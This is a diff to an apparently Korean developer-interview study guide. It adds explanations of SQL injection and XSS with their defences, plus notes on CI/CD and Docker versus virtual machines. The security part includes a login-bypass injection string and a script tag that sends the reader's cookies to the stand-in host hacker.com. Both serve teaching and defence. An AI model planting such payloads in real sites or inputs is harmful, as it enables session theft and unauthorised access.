@@ -2062,7 +2062,33 @@ Stateless한 인증 방식. 서버 저장소 없이 토큰 자체에 정보를 �
 <br>
 
 - **SQL Injection**: 입력값에 SQL 구문을 삽입해 DB 조작. -> **Prepared Statement**로 방어.
+    *   **공격 예시**: 로그인 ID에 `admin' OR '1'='1` 입력 -> 비밀번호 없이 로그인 성공.
+    ```sql
+    -- 해커가 만든 쿼리 (항상 참이 되어버림)
+    SELECT * FROM users WHERE id = 'admin' OR '1'='1' AND password = '...';
+    ```
+    *   **방어 코드**: `PreparedStatement` 사용 (`?` 바인딩)
+    ```java
+    // 입력값을 단순 문자열로만 취급하여 실행 구문으로 인식하지 않음
+    String sql = "SELECT * FROM users WHERE id = ? AND password = ?";
+    pstmt = conn.prepareStatement(sql);
+    pstmt.setString(1, inputId); 
+    ```
+
 - **XSS** (Cross Site Scripting): 악성 스크립트 실행 공격. -> **입력값 검증 및 Escaping**으로 방어.
+    *   **공격 예시**: 게시판에 스크립트 태그 삽입 -> 열람하는 사용자 쿠키 탈취.
+    ```html
+    <script>location.href='http://hacker.com?cookie='+document.cookie</script>
+    ```
+    > **원리**: 
+    > 1. 해커가 게시판에 위 코드를 작성해서 올림.
+    > 2. 일반 사용자가 해당 게시글을 **읽는 순간**, 브라우저가 위 코드를 실행함.
+    > 3. 사용자의 **쿠키**가 해커 서버로 전송됨 -> 해킹 완료.
+
+    *   **방어 예시**: 특수문자를 HTML 엔티티로 치환 (Escaping).
+    ```text
+    <script> -> &lt;script&gt; (브라우저가 실행하지 않고 글자로 보여줌)
+    ```
 
 </details>
 
@@ -2072,7 +2098,24 @@ Stateless한 인증 방식. 서버 저장소 없이 토큰 자체에 정보를 �
 <br>
 
 - **CI/CD**: 지속적 통합 및 배포 자동화 파이프라인.
-- **Docker**: 환경에 구애받지 않고 애플리케이션을 실행하는 컨테이너 기술.
+    *   **CI (Continuous Integration, 지속적 통합)**: 
+        *   개발자가 코드를 푸시하면 -> 자동으로 **빌드(Build) & 테스트(Test)**를 수행하여 문제없음을 검증하고 메인 브랜치에 통합하는 과정.
+        *   핵심: **"버그를 조기에 발견하고 해결"** (Github Actions, Jenkins)
+    *   **CD (Continuous Deployment, 지속적 배포)**:
+        *   통합된 코드를 자동으로 운영 서버에 **배포(Deploy)**하는 과정.
+        *   핵심: **"개발 생산성 증대 & 빠른 고객 피드백 반영"** (AWS CodeDeploy, Blue/Green 무중단 배포)
+
+- **Docker (vs VM)**: 애플리케이션 실행 환경을 격리하는 **컨테이너** 기술.
+    *   **탄생 배경 (VM의 한계)**: 기존 가상머신(VM)은 OS 위에 또 다른 **OS(Guest OS)를 통째로 설치**해야 해서 매우 무겁고 느렸습니다. (리소스 낭비 심함)
+    *   **도커의 혁신**: OS 전체를 설치하는 대신, **리눅스 커널은 공유**하고 애플리케이션 실행에 필요한 라이브러리/설정만 격리합니다.
+    *   **장점**: **가볍고 빠르며**, "내 컴퓨터에선 되는데 서버에선 안돼요"라는 환경 불일치 문제를 해결했습니다.
+
+    > **Q. 그럼 맥(macOS)이나 윈도우에서는 어떻게 리눅스 컨테이너를 돌리나요?**
+    > 
+    > **사용자의 컴퓨터(Host OS) 위에** 아주 가벼운 **리눅스 가상머신**(VM)을 띄워서 그 안에서 도커를 실행합니다.
+    > *   **구조**: 맥북(Host) -> 리눅스 VM(Guest) -> 도커 컨테이너
+    > *   (도커 데스크탑을 설치하면 이 VM을 자동으로 관리해 줍니다.)
+
 - **Load Balancer**: 트래픽을 여러 서버로 분산 (L4: IP/Port, L7: URL/Header).
 
 </details>
